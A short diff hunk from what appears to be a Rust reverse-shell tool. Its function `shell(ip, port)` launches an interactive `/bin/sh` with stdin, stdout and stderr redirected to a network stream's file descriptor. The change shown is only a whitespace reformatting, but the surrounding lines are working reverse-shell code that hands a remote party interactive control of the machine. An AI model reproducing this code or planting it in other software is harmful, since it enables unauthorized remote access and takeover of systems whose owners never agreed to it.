@@ -14,9 +14,9 @@ pub fn shell(ip: &str, port: u16) {
     // Open shell and set the file descriptor for stdin/stdout/stderr to the stream's file descriptor
     Command::new("/bin/sh")
         .arg("-i")
-        .stdin( Stdio::from(fd.try_clone().unwrap()) )
-        .stdout( Stdio::from(fd.try_clone().unwrap()) )
-        .stderr( Stdio::from(fd) )
+        .stdin(Stdio::from(fd.try_clone().unwrap()))
+        .stdout(Stdio::from(fd.try_clone().unwrap()))
+        .stderr(Stdio::from(fd))
         .spawn()
         .unwrap()
         .wait()
